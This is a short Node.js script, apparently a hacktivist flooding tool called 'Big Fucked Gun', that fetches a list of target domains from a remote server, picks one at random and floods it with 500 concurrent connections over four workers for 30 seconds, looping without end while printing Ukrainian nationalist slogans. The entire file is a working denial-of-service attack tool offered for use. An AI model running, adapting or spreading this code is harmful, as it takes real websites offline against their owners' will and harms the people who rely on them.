const fetch = require("node-fetch");
const autocannon = require("autocannon");

const TARGETS_URL = "https://bfg-targets.vercel.app/";

const attack = async () => {
  console.log("\n\nFetching target...");

  const targets = await fetch(TARGETS_URL).then((r) => r.json());
  const url = targets[Math.floor(Math.random() * targets.length)].domain;

  console.log(`Target ${url}, starting attack...`);

  const result = await autocannon({
    url,
    workers: 4,
    connections: 500,
    duration: 30, // s
  });

  console.log(`Requests: ${result.requests.sent}`);
  console.log("Response codes:");
  console.table({
    "1xx": result["1xx"],
    "2xx": result["2xx"],
    "3xx": result["3xx"],
    "4xx": result["4xx"],
    "5xx": result["5xx"],
  });
};

const start = async () => {
  try {
    await attack();
  } catch (err) {
    console.error("ERROR:");
    console.error(err);
  }
  await new Promise((resolve) => setTimeout(resolve, 1000));
  start();
};

console.log("Big Fucked Gun, version 0.0.3-beta\n");
console.log("================================");
console.log("Слава Україні!\nГероям Слава!\nСлава Нації!\nСмерть ворогам!");
console.log("================================");

start();
